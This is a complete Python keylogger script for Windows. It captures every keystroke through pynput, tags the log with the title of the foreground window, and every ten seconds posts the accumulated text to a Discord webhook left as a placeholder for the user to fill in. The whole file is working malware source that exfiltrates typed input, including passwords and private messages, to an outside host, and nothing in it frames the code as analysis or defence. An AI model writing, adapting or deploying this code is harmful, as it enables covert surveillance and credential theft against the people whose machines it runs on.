from pynput import keyboard
from datetime import datetime
import time
import win32gui
import threading
import requests

log = ""
lock = threading.Lock()
WEBHOOK_URL = "WEBHOOK_URL" # Place your discord webhook here

def on_press(key):
    global log
    with lock:
        try:
            if key.char:
                log += key.char
                print(key.char, end="", flush=True)
        except AttributeError:
            name = ""
            if key == keyboard.Key.space:
                name = " "
            elif key == keyboard.Key.enter:
                name = "\n"
            elif key == keyboard.Key.backspace:
                name = "[⌫]"
            elif key == keyboard.Key.delete:
                name = "[del]"
            elif key == keyboard.Key.tab:
                name = "[TAB]"
            elif key == keyboard.Key.shift:
                name = "[SHIFT]"
            elif key == keyboard.Key.alt:
                name = "[ALT]"
            elif key == keyboard.Key.ctrl:
                name = "[CTRL]"
            elif key == keyboard.Key.caps_lock:
                name = "[CAPS]"
            else:
                name = f"[{key.name}]"
            log += name
            print(name, end="", flush=True)

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def time_loop():
    global log
    while True:
        now = datetime.strftime(datetime.now(), "%H:%M:%S")
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        msg = f"\n[{now}] Active window: {title}\n"
        print(msg, end="", flush=True)
        with lock:
            log += msg
        time.sleep(10)
threading.Thread(target=time_loop, daemon=True).start()

def send_log():
    global log
    while True:
        time.sleep(10)
        with lock:
            if log.strip():
                data = {"content": log}
                try:
                    requests.post(WEBHOOK_URL, json=data)
                    print("\n[+] Log was sent\n")
                    log = ""
                except Exception as e:
                    print(f"[!] Error: {e}")

threading.Thread(target=send_log, daemon=True).start()

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
 listener.join()




